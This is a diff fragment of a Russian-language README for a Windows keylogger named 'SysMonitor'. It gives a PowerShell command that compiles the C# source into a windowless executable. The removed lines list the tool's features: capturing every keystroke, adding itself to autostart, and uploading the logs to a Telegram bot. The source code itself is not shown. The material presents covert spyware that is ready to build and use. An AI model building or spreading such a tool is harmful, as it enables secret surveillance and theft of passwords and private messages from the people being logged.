@@ -35,9 +35,3 @@
 `cd C:\SyS
 & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:winexe /out:C:\SyS\SysMonitor.exe /reference:System.Windows.Forms.dll C:\SyS\SysMonitor.cs` - адаптируйте этот код под свой путь и запустите его через `powershell`
 6) Готово, в вашей папке создался файл `SysMonitor.exe`
-
-## Возможности
-1) Запись клавиш, вводимых с клавиатуры (включая спец символы)
-2) Автоматическое помещение в автозагрузку
-3) Выгрузка логов в телеграмм бота
-4) Автоопределение чат айди
